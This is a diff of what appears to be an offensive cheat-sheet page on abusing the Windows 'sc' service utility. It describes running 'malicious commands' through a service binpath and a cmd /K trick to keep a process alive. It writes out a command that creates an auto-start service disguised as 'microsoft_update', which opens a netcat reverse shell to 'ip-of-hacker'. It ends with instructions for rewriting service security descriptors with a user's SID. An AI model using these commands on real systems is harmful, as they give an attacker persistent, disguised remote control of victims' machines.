@@ -13,11 +13,14 @@ Other flags<br/>
 start= auto <br/>
 error= ignore<br/>
 <br/>
-<br/>
 #The sc utility throws an error each time we start the service with one of our malicious commands in the binpath. &nbsp;This is because the net user and net localgroup commands do not point to the service binary and therefore the SCM cannot communicate with the service. &nbsp;Never fear, however, as the error is thrown only after issuing our malicious commands.<br/>
 <br/>
 Easy way around this is to have cmd.exe /k &lt;pathtoexe&gt;. The cmd.exe shell will close, but your second launched process will continue to run. <br/>
-<br/>
 sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” start= auto error= ignore<br/>
 <br/>
-See Powershell section for managing services in PowerShell</body></html>
+See Powershell section for managing services in PowerShell<br/>
+<br/>
+sc sdshow &lt;Service&gt;&#09;&#09;&#09;&#09;&#09;Displays the security descriptor for a specific service<br/>
+sc &lt;server&gt; sdset &lt;Service&gt; &lt;SDDL&gt;&#09;Changes the security descriptor for a specific service<br/>
+<br/>
+for sdset, instead of a group, you can use a specific user's full SID like: (A;;RPWP;;;S-1-5-21-3778091102-209736168-4156975864-1108)</body></html>
